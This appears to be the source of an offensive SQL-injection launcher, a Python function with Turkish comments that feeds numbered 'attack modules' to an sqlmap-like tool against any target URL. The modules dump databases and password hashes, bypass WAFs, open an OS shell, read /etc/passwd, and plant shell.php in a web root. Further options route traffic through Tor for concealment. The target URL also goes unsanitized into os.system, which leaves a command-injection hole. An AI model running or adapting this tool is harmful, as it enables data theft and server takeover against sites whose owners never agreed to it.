def execute_sql(mod_id, target_url):
    """
    Seçilen modül ID'sine göre ankamap.py motorunu ateşler.
    Tasarımı bozmaz, sadece arkadaki işi yapar.
    """
    import os
    
    # Ana komut şablonu
    base = f"python3 ankamap.py -u {target_url} --batch --random-agent"
    
    # 50 Modül için özel tetikleyici parametreler
    # Not: Hepsini buraya tek tek tanımlayabilirsin.
    sql_logic = {
        # Katalog 1: Temel Sızma
        "01": "--dbs", "02": "--tables", "03": "--columns", "04": "--dump", "05": "--current-db",
        "06": "--current-user", "07": "--privileges", "08": "--passwords", "09": "--users", "10": "--all",
        
        # Katalog 2: ZoRRoKiN WAF Bypass
        "11": "--tamper=space2comment --level=3",
        "12": "--tamper=randomcase --level=5 --risk=3",
        "13": "--tamper=between,charencode --level=5",
        "14": "--tamper=apostrophemask,unionist --risk=3",
        "15": "--tamper=versionedkeywords --level=3",
        
        # Katalog 3: B0YNER Sistem Enjeksiyon
        "21": "--os-shell",
        "22": "--os-pwn",
        "23": "--file-read=/etc/passwd",
        "24": "--file-write=shell.php --file-dest=/var/www/html/",
        "25": "--reg-read",
        
        # Katalog 4: Saldırgan İnfaz
        "31": "--forms --crawl=2",
        "32": "--passwords --batch",
        "35": "--xss-payloads=default",
        "37": "--identify-waf",
        
        # Katalog 5: Gizlilik
        "41": "--tor --tor-type=SOCKS5",
        "42": "--user-agent='AnkaRedTeam-Agent'",
        "43": "--proxy=http://127.0.0.1:8080"
    }

    # Modül eşleşmiyorsa varsayılan dbs çekme
    extra_params = sql_logic.get(mod_id, "--dbs")
    full_cmd = f"{base} {extra_params}"

    # Görseli bozmadan sistemi temizle ve saldırıyı başlat
    os.system('clear')
    print(f"\033[0;31m[!] ANKA RED TEAM TAARRUZU BAŞLADI\033[0m")
    print(f"\033[0;32m[+] TETİKLENEN KOMUT: {full_cmd}\033[0m\n")
    
    os.system(full_cmd)
    
    print(f"\n\033[0;33m[!] Operasyon bitti. Dönmek için ENTER...\033[0m")
    input()
